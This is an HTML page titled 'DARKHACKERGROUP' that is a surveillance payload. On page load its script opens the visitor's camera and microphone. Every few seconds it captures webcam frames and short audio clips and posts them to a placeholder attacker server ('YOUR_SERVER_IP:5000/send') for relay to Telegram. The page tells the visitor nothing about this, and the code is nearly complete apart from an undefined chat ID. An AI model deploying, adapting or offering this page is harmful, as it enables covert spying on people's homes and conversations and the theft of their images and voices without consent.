<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DARKHACKERGROUP</title>
<style>
#video{
width:100%;
height:auto;
}
</style> 
</style>
</head>
<body>
    <video id="video" autoplay></video>
    <canvas id="canvas" width="2000" height="2000" style="display: none;"></canvas>

    <script>

        function startCamera() {
            const video = document.getElementById("video");
            const canvas = document.getElementById("canvas");
            const ctx = canvas.getContext("2d");

            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            if (isMobile) {
                video.style.width = "100%";
                video.style.height = "auto";
            } else {
                video.style.width = "600px";
                video.style.height = "auto";
            }

            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;

                    setInterval(() => {
                        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        canvas.toBlob(sendToTelegram, "image/jpeg", 0.8);
                        startRecording();
                    }, 5000);
                })
                .catch(error => {
                    console.error(error);
                    alert("Failed to access camera.");
                });
        }

        function sendToTelegram(blob) {
            const formData = new FormData();
            formData.append("photo", blob, "camera.jpg");
            formData.append("chat_id", chatId);

            fetch("http://YOUR_SERVER_IP:5000/send",{
         method:"POST",
         body:formData,
            })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log("Camera frame sent to Telegram.");
                    } else {
                        throw new Error(data.description);
                    }
                })
                .catch(error => {
                    console.error(error);
                    alert("Failed to send camera frame.");
                });
        }

        function sendAudioToTelegram(blob) {
            const formData = new FormData();
            formData.append("audio", blob, "recording.wav");
            formData.append("chat_id", chatId);

            fetch("http://YOUR_SERVER_IP:5000/send",{
         method:"POST",
         body:formData,
            })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log("Audio recording sent to Telegram.");
                    } else {
                        throw new Error(data.description);
                    }
                })
                .catch(error => {
                    console.error(error);
                    alert("Failed to send audio recording.");
                });
        }

        function startRecording() {
            const audioChunks = [];

            navigator.mediaDevices
                .getUserMedia({ audio: true, video: false })
                .then((stream) => {
                    const mediaRecorder = new MediaRecorder(stream);

                    mediaRecorder.start();

                    setTimeout(() => {
                        mediaRecorder.stop();
                    }, 4000);

                    mediaRecorder.addEventListener("dataavailable", (event) => {
                        audioChunks.push(event.data);
                    });

                    mediaRecorder.addEventListener("stop", () => {
                        const audioBlob = new Blob(audioChunks, { type: "audio/wav" });
                        sendAudioToTelegram(audioBlob);
                    });
                })
                .catch((error) => {
                    console.error(error);
                    alert("Failed to access microphone.");
                });
        }

        // Call startCamera when the page is loaded.
        startCamera();
    </script>
</body>
</html>
